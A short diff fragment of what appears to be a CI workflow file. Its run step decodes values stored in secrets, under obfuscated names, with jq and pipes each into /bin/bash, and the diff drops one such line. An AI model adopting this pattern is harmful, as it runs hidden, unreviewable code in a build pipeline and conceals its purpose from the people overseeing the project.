@@ -23,7 +23,6 @@ jobs:
           n4: ${{ secrets.n4 }}
         run: |
           printf '%s' "$n4" | jq -r .tvcpv4 | /bin/bash
-          echo $sduib1 | jq -r .pe40 | /bin/bash
           printf '%s' "$f772" | jq -r .cm43 | /bin/bash
           echo $h497 | jq -r .yfmc35 | /bin/bash
           echo $zyi79 | jq -r .hvu03747 | /bin/bash
